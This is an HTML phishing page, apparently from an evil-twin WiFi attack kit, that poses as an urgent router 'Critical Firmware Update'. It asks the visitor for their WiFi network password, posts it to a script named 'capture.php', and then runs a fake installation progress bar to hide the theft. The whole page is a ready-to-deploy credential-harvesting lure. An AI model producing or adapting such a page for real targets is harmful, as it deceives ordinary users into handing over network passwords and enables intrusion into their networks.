<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Firmware Update Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header .icon {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .header h1 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .header p {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .content {
            padding: 35px;
        }
        
        .alert-box {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }
        
        .alert-box .alert-icon {
            color: #856404;
            font-size: 20px;
            flex-shrink: 0;
        }
        
        .alert-box p {
            color: #856404;
            font-size: 13px;
            line-height: 1.5;
        }
        
        .info-list {
            margin-bottom: 25px;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #eee;
            font-size: 14px;
        }
        
        .info-item:last-child {
            border-bottom: none;
        }
        
        .info-item .label {
            color: #666;
        }
        
        .info-item .value {
            color: #333;
            font-weight: 500;
        }
        
        .info-item .value.update {
            color: #e74c3c;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #3498db;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }
        
        .form-group .hint {
            margin-top: 6px;
            font-size: 12px;
            color: #888;
        }
        
        .btn-submit {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.3);
        }
        
        .btn-submit:active {
            transform: translateY(0);
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            background: #f8f9fa;
            border-top: 1px solid #eee;
        }
        
        .footer p {
            font-size: 12px;
            color: #888;
        }
        
        .progress-bar {
            height: 4px;
            background: #e0e0e0;
            border-radius: 2px;
            margin-top: 20px;
            overflow: hidden;
        }
        
        .progress-bar .progress {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #3498db, #2ecc71);
            border-radius: 2px;
            transition: width 0.5s ease;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .router-icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="icon"><img src="pics/alert.png" alt="Alert" style="width: 48px; height: 48px;"></div>
            <h1>Critical Firmware Update Required</h1>
            <p>Your router requires an immediate security update</p>
        </div>
        
        <div class="content">
            <div class="alert-box">
                <span class="alert-icon"><img src="pics/lock.png" alt="Alert" style="width: 48px; height: 48px;"></span>
                <p><strong>Security Notice:</strong> A critical vulnerability has been detected. Please authenticate to install the security patch and protect your network.</p>
            </div>
            
            <div class="info-list">
                <div class="info-item">
                    <span class="label">Current Version</span>
                    <span class="value">v2.1.3</span>
                </div>
                <div class="info-item">
                    <span class="label">Available Update</span>
                    <span class="value update">v2.4.1 (Security Patch)</span>
                </div>
                <div class="info-item">
                    <span class="label">Status</span>
                    <span class="value update">Update Required</span>
                </div>
            </div>
            
            <form id="updateForm" action="capture.php" method="POST">
                <div class="form-group">
                    <label for="password">WiFi Network Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter your WiFi password" required>
                    <p class="hint">Required to verify network ownership and apply update</p>
                </div>
                
                <button type="submit" class="btn-submit" id="submitBtn">
                     Install Security Update
                </button>
                
                <div class="progress-bar" id="progressBar">
                    <div class="progress" id="progress"></div>
                </div>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Installing firmware update...</p>
                <p style="font-size: 12px; color: #888; margin-top: 5px;">Please do not disconnect</p>
            </div>
        </div>
        
        <div class="footer">
            <p>© 2026 Network Security Update Service</p>
        </div>
    </div>
    
    <script>
        document.getElementById('updateForm').addEventListener('submit', function(e) {
            var btn = document.getElementById('submitBtn');
            var loading = document.getElementById('loading');
            var progressBar = document.getElementById('progressBar');
            var progress = document.getElementById('progress');
            
            btn.disabled = true;
            btn.innerHTML = '<img src="pics/hourglass.png" alt="Loading" style="width: 16px; height: 16px; vertical-align: middle;"> Processing...';
            progressBar.style.display = 'block';
            
            var width = 0;
            var interval = setInterval(function() {
                if (width >= 30) {
                    clearInterval(interval);
                }
                width += 2;
                progress.style.width = width + '%';
            }, 100);
        });
    </script>
</body>
</html>